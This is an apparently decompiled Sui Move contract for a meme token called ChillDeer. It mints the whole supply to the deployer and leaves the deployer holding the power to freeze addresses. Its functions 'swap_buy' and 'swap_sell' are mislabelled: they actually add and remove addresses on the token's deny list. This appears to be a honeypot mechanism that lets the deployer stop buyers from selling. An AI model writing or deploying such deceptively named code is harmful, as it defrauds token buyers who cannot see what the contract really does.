module 0x622803e2a87015e0f315339fd42b3fd19387779d6d6db0d41d31e1424b8eff02::chilldeer {
    struct CHILLDEER has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLDEER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLDEER>(arg0, 9, b"ChillDeer", b"Just A Chill Reindeer", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYVUdkeDy5X4qtn3mH3kLVKoSfUShWWDEw1xNLSTuWUCj"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLDEER>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLDEER>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLDEER>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLDEER>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLDEER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLDEER>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLDEER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLDEER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

